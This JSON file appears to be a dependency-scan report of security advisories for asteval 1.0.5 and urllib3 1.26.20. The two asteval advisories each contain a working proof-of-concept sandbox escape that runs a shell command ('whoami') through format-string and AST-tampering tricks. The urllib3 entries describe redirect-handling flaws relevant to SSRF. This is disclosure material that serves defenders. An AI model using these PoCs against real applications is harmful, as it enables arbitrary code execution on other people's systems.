[
  {
    "package": {
      "name": "asteval",
      "version": "1.0.5",
      "ecosystem": "PyPI"
    },
    "vulnerabilities": [
      {
        "modified": "2025-01-25T01:10:49Z",
        "published": "2025-01-24T18:45:30Z",
        "schema_version": "1.6.0",
        "id": "GHSA-3wwr-3g9f-9gc7",
        "aliases": [
          "CVE-2025-24359"
        ],
        "summary": "ASTEVAL Allows Maliciously Crafted Format Strings to Lead to Sandbox Escape",
        "details": "### Summary\nIf an attacker can control the input to the `asteval` library, they can bypass asteval's restrictions and execute arbitrary Python code in the context of the application using the library.\n\n### Details\nThe vulnerability is rooted in how `asteval` performs handling of `FormattedValue` AST nodes. In particular, the [`on_formattedvalue`](https://github.com/lmfit/asteval/blob/cfb57f0beebe0dc0520a1fbabc35e66060c7ea71/asteval/asteval.py#L507) value uses the [dangerous format method of the str class](https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/), as shown in the vulnerable code snippet below:\n\n```py\n    def on_formattedvalue(self, node): # ('value', 'conversion', 'format_spec')\n        \"formatting used in f-strings\"\n        val = self.run(node.value)\n        fstring_converters = {115: str, 114: repr, 97: ascii}\n        if node.conversion in fstring_converters:\n            val = fstring_converters[node.conversion](val)\n        fmt = '{__fstring__}'\n        if node.format_spec is not None:\n            fmt = f'{{__fstring__:{self.run(node.format_spec)}}}'\n        return fmt.format(__fstring__=val)\n```\n\nThe code above allows an attacker to manipulate the value of the string used in the dangerous call `fmt.format(__fstring__=val)`. This vulnerability can be exploited to access protected attributes by intentionally triggering an `AttributeError` exception. The attacker can then catch the exception and use its `obj` attribute to gain arbitrary access to sensitive or protected object properties.\n\n### PoC\nThe following proof-of-concept (PoC) demonstrates how this vulnerability can be exploited to execute the `whoami` command on the host machine:\n\n```py\nfrom asteval import Interpreter\naeval = Interpreter()\ncode = \"\"\"\n# def lender():\n#     ga\n    \ndef pwn():\n    try:\n        f\"{dict.mro()[1]:'\\\\x7B__fstring__.__getattribute__.s\\\\x7D'}\"\n    except Exception as ga:\n        ga = ga.obj\n        sub = ga(dict.mro()[1],\"__subclasses__\")()\n        importer = None\n        for i in sub:\n            if \"BuiltinImporter\" in str(i):\n                importer = i.load_module\n                break\n        os = importer(\"os\")\n        os.system(\"whoami\")\n\n# pre commit cfb57f0beebe0dc0520a1fbabc35e66060c7ea71, it was required to modify the AST to make this work using the code below\n# pwn.body[0].handlers[0].name = lender.body[0].value # need to make it an identifier so node_assign works\n        \npwn()\n\"\"\"\naeval(code)\n\n```",
        "severity": [
          {
            "type": "CVSS_V3",
            "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
          }
        ],
        "affected": [
          {
            "package": {
              "ecosystem": "PyPI",
              "name": "asteval",
              "purl": "pkg:pypi/asteval"
            },
            "ranges": [
              {
                "type": "ECOSYSTEM",
                "events": [
                  {
                    "introduced": "0"
                  },
                  {
                    "fixed": "1.0.6"
                  }
                ]
              }
            ],
            "versions": [
              "0.9",
              "0.9.1",
              "0.9.10",
              "0.9.11",
              "0.9.12",
              "0.9.13",
              "0.9.14",
              "0.9.15",
              "0.9.16",
              "0.9.17",
              "0.9.18",
              "0.9.19",
              "0.9.2",
              "0.9.20",
              "0.9.21",
              "0.9.22",
              "0.9.23",
              "0.9.24",
              "0.9.25",
              "0.9.26",
              "0.9.27",
              "0.9.28",
              "0.9.29",
              "0.9.3",
              "0.9.30",
              "0.9.31",
              "0.9.32",
              "0.9.33",
              "0.9.4",
              "0.9.5",
              "0.9.6",
              "0.9.7",
              "0.9.8",
              "0.9.9",
              "1.0.0",
              "1.0.1",
              "1.0.2",
              "1.0.3",
              "1.0.4",
              "1.0.5"
            ],
            "database_specific": {
              "last_known_affected_version_range": "<= 1.0.5",
              "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/01/GHSA-3wwr-3g9f-9gc7/GHSA-3wwr-3g9f-9gc7.json"
            }
          }
        ],
        "references": [
          {
            "type": "WEB",
            "url": "https://github.com/lmfit/asteval/security/advisories/GHSA-3wwr-3g9f-9gc7"
          },
          {
            "type": "ADVISORY",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-24359"
          },
          {
            "type": "WEB",
            "url": "https://github.com/lmfit/asteval/commit/45bb47533f7abb5479618ae7f6a809215700dcb2"
          },
          {
            "type": "PACKAGE",
            "url": "https://github.com/lmfit/asteval"
          },
          {
            "type": "WEB",
            "url": "https://github.com/lmfit/asteval/blob/cfb57f0beebe0dc0520a1fbabc35e66060c7ea71/asteval/asteval.py#L507"
          },
          {
            "type": "WEB",
            "url": "https://lucumr.pocoo.org/2016/12/29/careful-with-str-format"
          }
        ],
        "database_specific": {
          "cwe_ids": [
            "CWE-134",
            "CWE-749"
          ],
          "github_reviewed": true,
          "github_reviewed_at": "2025-01-24T18:45:30Z",
          "nvd_published_at": "2025-01-24T17:15:16Z",
          "severity": "HIGH"
        }
      },
      {
        "modified": "2025-01-23T22:45:51Z",
        "published": "2025-01-23T22:33:48Z",
        "schema_version": "1.6.0",
        "id": "GHSA-vp47-9734-prjw",
        "summary": "ASTEVAL Allows Malicious Tampering of Exposed AST Nodes Leads to Sandbox Escape",
        "details": "### Summary\nIf an attacker can control the input to the asteval library, they can bypass its safety restrictions and execute arbitrary Python code within the application's context.\n\n### Details\nThe vulnerability is rooted in how `asteval` performs attribute access verification. In particular, the [`on_attribute`](https://github.com/lmfit/asteval/blob/8d7326df8015cf6a57506b1c2c167a1c3763e090/asteval/asteval.py#L565) node handler prevents access to attributes that are either present in the `UNSAFE_ATTRS` list or are formed by names starting and ending with `__`, as shown in the code snippet below:\n\n```py\n    def on_attribute(self, node):    # ('value', 'attr', 'ctx')\n        \"\"\"Extract attribute.\"\"\"\n\n        ctx = node.ctx.__class__\n        if ctx == ast.Store:\n            msg = \"attribute for storage: shouldn't be here!\"\n            self.raise_exception(node, exc=RuntimeError, msg=msg)\n\n        sym = self.run(node.value)\n        if ctx == ast.Del:\n            return delattr(sym, node.attr)\n        #\n        unsafe = (node.attr in UNSAFE_ATTRS or\n                 (node.attr.startswith('__') and node.attr.endswith('__')))\n        if not unsafe:\n            for dtype, attrlist in UNSAFE_ATTRS_DTYPES.items():\n                unsafe = isinstance(sym, dtype) and node.attr in attrlist\n                if unsafe:\n                    break\n        if unsafe:\n            msg = f\"no safe attribute '{node.attr}' for {repr(sym)}\"\n            self.raise_exception(node, exc=AttributeError, msg=msg)\n        else:\n            try:\n                return getattr(sym, node.attr)\n            except AttributeError:\n                pass\n```\n\nWhile this check is intended to block access to sensitive Python dunder methods (such as `__getattribute__`), the flaw arises because instances of the `Procedure` class expose their AST (stored in the `body` attribute) without proper protection:\n\n```py\nclass Procedure:\n    \"\"\"Procedure: user-defined function for asteval.\n\n    This stores the parsed ast nodes as from the 'functiondef' ast node\n    for later evaluation.\n\n    \"\"\"\n\n    def __init__(self, name, interp, doc=None, lineno=0,\n                 body=None, args=None, kwargs=None,\n                 vararg=None, varkws=None):\n        \"\"\"TODO: docstring in public method.\"\"\"\n        self.__ininit__ = True\n        self.name = name\n        self.__name__ = self.name\n        self.__asteval__ = interp\n        self.raise_exc = self.__asteval__.raise_exception\n        self.__doc__ = doc\n        self.body = body\n        self.argnames = args\n        self.kwargs = kwargs\n        self.vararg = vararg\n        self.varkws = varkws\n        self.lineno = lineno\n        self.__ininit__ = False\n```\n\nSince the `body` attribute is not protected by a naming convention that would restrict its modification, an attacker can modify the AST of a `Procedure` during runtime to leverage unintended behaviour.\n\nThe exploit works as follows:\n\n1. **The Time of Check, Time of Use (TOCTOU) Gadget:**\n\n   In the [code](https://github.com/lmfit/asteval/blob/8d7326df8015cf6a57506b1c2c167a1c3763e090/asteval/asteval.py#L577) below, a variable named `unsafe` is set based on whether `node.attr` is considered unsafe:\n\n   ```python\n   unsafe = (node.attr in UNSAFE_ATTRS or\n             (node.attr.startswith('__') and node.attr.endswith('__')))\n   ```\n\n2. **Exploiting the TOCTOU Gadget:**\n\n   An attacker can abuse this gadget by hooking any `Attribute` AST node that is not in the `UNSAFE_ATTRS` list. The attacker modifies the `node.attr.startswith` function so that it points to a custom procedure. This custom procedure performs the following steps:\n   \n   - It replaces the value of `node.attr` with the string `\"__getattribute__\"` and returns `False`.\n   - Thus, when `node.attr.startswith('__')` is evaluated, it returns `False`, which causes the condition to short-circuit and sets `unsafe` to `False`.\n   - However, by that time, `node.attr` has been changed to `\"__getattribute__\"`, which will be used in the subsequent `getattr(sym, node.attr)` call. An attacker can then use the obtained reference to `sym.__getattr__`to retrieve malicious attributes without needing to pass the `on_attribute` checks.\n\n### PoC\nThe following proof-of-concept (PoC) demonstrates how this vulnerability can be exploited to execute the `whoami` command on the host machine:\n\n```py\nfrom asteval import Interpreter\naeval = Interpreter()\ncode = \"\"\"\nga_str = \"__getattribute__\"\ndef lender():\n    a\n    b\ndef pwn():\n    ga = lender.dontcare\n    init = ga(\"__init__\")\n    ga = init.dontcare\n    globals = ga(\"__globals__\")\n    builtins = globals[\"__builtins__\"]\n    importer = builtins[\"__import__\"]\n    importer(\"os\").system(\"whoami\")\n\ndef startswith1(str):\n    # Replace the attr on the targeted AST node with \"__getattribute__\"\n    pwn.body[0].value.attr = ga_str\n    return False    \n\ndef startswith2(str):\n    pwn.body[2].value.attr = ga_str\n    return False    \n\nn1 = lender.body[0]\nn1.startswith = startswith1\npwn.body[0].value.attr = n1\n\nn2 = lender.body[1]\nn2.startswith = startswith2\npwn.body[2].value.attr = n2\n\npwn()\n\"\"\"\naeval(code)\n```",
        "severity": [
          {
            "type": "CVSS_V3",
            "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
          }
        ],
        "affected": [
          {
            "package": {
              "ecosystem": "PyPI",
              "name": "asteval",
              "purl": "pkg:pypi/asteval"
            },
            "ranges": [
              {
                "type": "ECOSYSTEM",
                "events": [
                  {
                    "introduced": "0"
                  },
                  {
                    "fixed": "1.0.6"
                  }
                ]
              }
            ],
            "versions": [
              "0.9",
              "0.9.1",
              "0.9.10",
              "0.9.11",
              "0.9.12",
              "0.9.13",
              "0.9.14",
              "0.9.15",
              "0.9.16",
              "0.9.17",
              "0.9.18",
              "0.9.19",
              "0.9.2",
              "0.9.20",
              "0.9.21",
              "0.9.22",
              "0.9.23",
              "0.9.24",
              "0.9.25",
              "0.9.26",
              "0.9.27",
              "0.9.28",
              "0.9.29",
              "0.9.3",
              "0.9.30",
              "0.9.31",
              "0.9.32",
              "0.9.33",
              "0.9.4",
              "0.9.5",
              "0.9.6",
              "0.9.7",
              "0.9.8",
              "0.9.9",
              "1.0.0",
              "1.0.1",
              "1.0.2",
              "1.0.3",
              "1.0.4",
              "1.0.5"
            ],
            "database_specific": {
              "last_known_affected_version_range": "<= 1.0.5",
              "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/01/GHSA-vp47-9734-prjw/GHSA-vp47-9734-prjw.json"
            }
          }
        ],
        "references": [
          {
            "type": "WEB",
            "url": "https://github.com/lmfit/asteval/security/advisories/GHSA-vp47-9734-prjw"
          },
          {
            "type": "WEB",
            "url": "https://github.com/lmfit/asteval/commit/45bb47533f7abb5479618ae7f6a809215700dcb2"
          },
          {
            "type": "PACKAGE",
            "url": "https://github.com/lmfit/asteval"
          }
        ],
        "database_specific": {
          "cwe_ids": [
            "CWE-367",
            "CWE-749"
          ],
          "github_reviewed": true,
          "github_reviewed_at": "2025-01-23T22:33:48Z",
          "nvd_published_at": null,
          "severity": "HIGH"
        }
      }
    ],
    "groups": [
      {
        "ids": [
          "GHSA-3wwr-3g9f-9gc7"
        ],
        "aliases": [
          "CVE-2025-24359",
          "GHSA-3wwr-3g9f-9gc7"
        ],
        "max_severity": "8.4"
      },
      {
        "ids": [
          "GHSA-vp47-9734-prjw"
        ],
        "aliases": [
          "GHSA-vp47-9734-prjw"
        ],
        "max_severity": "8.4"
      }
    ]
  },
  {
    "package": {
      "name": "urllib3",
      "version": "1.26.20",
      "ecosystem": "PyPI"
    },
    "vulnerabilities": [
      {
        "modified": "2025-06-18T18:27:18Z",
        "published": "2025-06-18T17:50:11Z",
        "schema_version": "1.6.0",
        "id": "GHSA-48p4-8xcf-vxj5",
        "aliases": [
          "CVE-2025-50182"
        ],
        "summary": "urllib3 does not control redirects in browsers and Node.js",
        "details": "urllib3 [supports](https://urllib3.readthedocs.io/en/2.4.0/reference/contrib/emscripten.html) being used in a Pyodide runtime utilizing the [JavaScript Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) or falling back on [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest). This means you can use Python libraries to make HTTP requests from your browser or Node.js. Additionally, urllib3 provides [a mechanism](https://urllib3.readthedocs.io/en/2.4.0/user-guide.html#retrying-requests) to control redirects.\n\nHowever, the `retries` and `redirect` parameters are ignored with Pyodide; the runtime itself determines redirect behavior.\n\n\n## Affected usages\n\nAny code which relies on urllib3 to control the number of redirects for an HTTP request in a Pyodide runtime.\n\n\n## Impact\n\nRedirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects may remain vulnerable if a Pyodide runtime redirect mechanism is unsuitable.\n\n\n## Remediation\n\nIf you use urllib3 in Node.js, upgrade to a patched version of urllib3.\n\nUnfortunately, browsers provide no suitable way which urllib3 can use: `XMLHttpRequest` provides no control over redirects, the Fetch API returns `opaqueredirect` responses lacking data when redirects are controlled manually. Expect default browser behavior for redirects.",
        "severity": [
          {
            "type": "CVSS_V3",
            "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N"
          }
        ],
        "affected": [
          {
            "package": {
              "ecosystem": "PyPI",
              "name": "urllib3",
              "purl": "pkg:pypi/urllib3"
            },
            "ranges": [
              {
                "type": "ECOSYSTEM",
                "events": [
                  {
                    "introduced": "0"
                  },
                  {
                    "fixed": "2.5.0"
                  }
                ]
              }
            ],
            "versions": [
              "0.2",
              "0.3",
              "0.3.1",
              "0.4.0",
              "0.4.1",
              "1.0",
              "1.0.1",
              "1.0.2",
              "1.1",
              "1.10",
              "1.10.1",
              "1.10.2",
              "1.10.3",
              "1.10.4",
              "1.11",
              "1.12",
              "1.13",
              "1.13.1",
              "1.14",
              "1.15",
              "1.15.1",
              "1.16",
              "1.17",
              "1.18",
              "1.18.1",
              "1.19",
              "1.19.1",
              "1.2",
              "1.2.1",
              "1.2.2",
              "1.20",
              "1.21",
              "1.21.1",
              "1.22",
              "1.23",
              "1.24",
              "1.24.1",
              "1.24.2",
              "1.24.3",
              "1.25",
              "1.25.1",
              "1.25.10",
              "1.25.11",
              "1.25.2",
              "1.25.3",
              "1.25.4",
              "1.25.5",
              "1.25.6",
              "1.25.7",
              "1.25.8",
              "1.25.9",
              "1.26.0",
              "1.26.1",
              "1.26.10",
              "1.26.11",
              "1.26.12",
              "1.26.13",
              "1.26.14",
              "1.26.15",
              "1.26.16",
              "1.26.17",
              "1.26.18",
              "1.26.19",
              "1.26.2",
              "1.26.20",
              "1.26.3",
              "1.26.4",
              "1.26.5",
              "1.26.6",
              "1.26.7",
              "1.26.8",
              "1.26.9",
              "1.3",
              "1.4",
              "1.5",
              "1.6",
              "1.7",
              "1.7.1",
              "1.8",
              "1.8.2",
              "1.8.3",
              "1.9",
              "1.9.1",
              "2.0.0",
              "2.0.0a1",
              "2.0.0a2",
              "2.0.0a3",
              "2.0.0a4",
              "2.0.1",
              "2.0.2",
              "2.0.3",
              "2.0.4",
              "2.0.5",
              "2.0.6",
              "2.0.7",
              "2.1.0",
              "2.2.0",
              "2.2.1",
              "2.2.2",
              "2.2.3",
              "2.3.0",
              "2.4.0"
            ],
            "database_specific": {
              "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-48p4-8xcf-vxj5/GHSA-48p4-8xcf-vxj5.json"
            }
          }
        ],
        "references": [
          {
            "type": "WEB",
            "url": "https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5"
          },
          {
            "type": "WEB",
            "url": "https://github.com/urllib3/urllib3/commit/7eb4a2aafe49a279c29b6d1f0ed0f42e9736194f"
          },
          {
            "type": "PACKAGE",
            "url": "https://github.com/urllib3/urllib3"
          }
        ],
        "database_specific": {
          "cwe_ids": [
            "CWE-601"
          ],
          "github_reviewed": true,
          "github_reviewed_at": "2025-06-18T17:50:11Z",
          "nvd_published_at": null,
          "severity": "MODERATE"
        }
      },
      {
        "modified": "2025-06-18T18:27:18Z",
        "published": "2025-06-18T17:50:00Z",
        "schema_version": "1.6.0",
        "id": "GHSA-pq67-6m6q-mj2v",
        "aliases": [
          "CVE-2025-50181"
        ],
        "summary": "urllib3 redirects are not disabled when retries are disabled on PoolManager instantiation",
        "details": "urllib3 handles redirects and retries using the same mechanism, which is controlled by the `Retry` object. The most common way to disable redirects is at the request level, as follows:\n\n```python\nresp = urllib3.request(\"GET\", \"https://httpbin.org/redirect/1\", redirect=False)\nprint(resp.status)\n# 302\n```\n\nHowever, it is also possible to disable redirects, for all requests, by instantiating a `PoolManager` and specifying `retries` in a way that disable redirects:\n\n```python\nimport urllib3\n\nhttp = urllib3.PoolManager(retries=0)  # should raise MaxRetryError on redirect\nhttp = urllib3.PoolManager(retries=urllib3.Retry(redirect=0))  # equivalent to the above\nhttp = urllib3.PoolManager(retries=False)  # should return the first response\n\nresp = http.request(\"GET\", \"https://httpbin.org/redirect/1\")\n```\n\nHowever, the `retries` parameter is currently ignored, which means all the above examples don't disable redirects.\n\n## Affected usages\n\nPassing `retries` on `PoolManager` instantiation to disable redirects or restrict their number.\n\nBy default, requests and botocore users are not affected.\n\n## Impact\n\nRedirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects at the PoolManager level will remain vulnerable.\n\n## Remediation\n\nYou can remediate this vulnerability with the following steps:\n\n * Upgrade to a patched version of urllib3. If your organization would benefit from the continued support of urllib3 1.x, please contact [sethmichaellarson@gmail.com](mailto:sethmichaellarson@gmail.com) to discuss sponsorship or contribution opportunities.\n * Disable redirects at the `request()` level instead of the `PoolManager()` level.",
        "severity": [
          {
            "type": "CVSS_V3",
            "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N"
          }
        ],
        "affected": [
          {
            "package": {
              "ecosystem": "PyPI",
              "name": "urllib3",
              "purl": "pkg:pypi/urllib3"
            },
            "ranges": [
              {
                "type": "ECOSYSTEM",
                "events": [
                  {
                    "introduced": "0"
                  },
                  {
                    "fixed": "2.5.0"
                  }
                ]
              }
            ],
            "versions": [
              "0.2",
              "0.3",
              "0.3.1",
              "0.4.0",
              "0.4.1",
              "1.0",
              "1.0.1",
              "1.0.2",
              "1.1",
              "1.10",
              "1.10.1",
              "1.10.2",
              "1.10.3",
              "1.10.4",
              "1.11",
              "1.12",
              "1.13",
              "1.13.1",
              "1.14",
              "1.15",
              "1.15.1",
              "1.16",
              "1.17",
              "1.18",
              "1.18.1",
              "1.19",
              "1.19.1",
              "1.2",
              "1.2.1",
              "1.2.2",
              "1.20",
              "1.21",
              "1.21.1",
              "1.22",
              "1.23",
              "1.24",
              "1.24.1",
              "1.24.2",
              "1.24.3",
              "1.25",
              "1.25.1",
              "1.25.10",
              "1.25.11",
              "1.25.2",
              "1.25.3",
              "1.25.4",
              "1.25.5",
              "1.25.6",
              "1.25.7",
              "1.25.8",
              "1.25.9",
              "1.26.0",
              "1.26.1",
              "1.26.10",
              "1.26.11",
              "1.26.12",
              "1.26.13",
              "1.26.14",
              "1.26.15",
              "1.26.16",
              "1.26.17",
              "1.26.18",
              "1.26.19",
              "1.26.2",
              "1.26.20",
              "1.26.3",
              "1.26.4",
              "1.26.5",
              "1.26.6",
              "1.26.7",
              "1.26.8",
              "1.26.9",
              "1.3",
              "1.4",
              "1.5",
              "1.6",
              "1.7",
              "1.7.1",
              "1.8",
              "1.8.2",
              "1.8.3",
              "1.9",
              "1.9.1",
              "2.0.0",
              "2.0.0a1",
              "2.0.0a2",
              "2.0.0a3",
              "2.0.0a4",
              "2.0.1",
              "2.0.2",
              "2.0.3",
              "2.0.4",
              "2.0.5",
              "2.0.6",
              "2.0.7",
              "2.1.0",
              "2.2.0",
              "2.2.1",
              "2.2.2",
              "2.2.3",
              "2.3.0",
              "2.4.0"
            ],
            "database_specific": {
              "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-pq67-6m6q-mj2v/GHSA-pq67-6m6q-mj2v.json"
            }
          }
        ],
        "references": [
          {
            "type": "WEB",
            "url": "https://github.com/urllib3/urllib3/security/advisories/GHSA-pq67-6m6q-mj2v"
          },
          {
            "type": "WEB",
            "url": "https://github.com/urllib3/urllib3/commit/f05b1329126d5be6de501f9d1e3e36738bc08857"
          },
          {
            "type": "PACKAGE",
            "url": "https://github.com/urllib3/urllib3"
          }
        ],
        "database_specific": {
          "cwe_ids": [
            "CWE-601"
          ],
          "github_reviewed": true,
          "github_reviewed_at": "2025-06-18T17:50:00Z",
          "nvd_published_at": null,
          "severity": "MODERATE"
        }
      }
    ],
    "groups": [
      {
        "ids": [
          "GHSA-48p4-8xcf-vxj5"
        ],
        "aliases": [
          "CVE-2025-50182",
          "GHSA-48p4-8xcf-vxj5"
        ],
        "max_severity": "5.3"
      },
      {
        "ids": [
          "GHSA-pq67-6m6q-mj2v"
        ],
        "aliases": [
          "CVE-2025-50181",
          "GHSA-pq67-6m6q-mj2v"
        ],
        "max_severity": "5.3"
      }
    ]
  }
]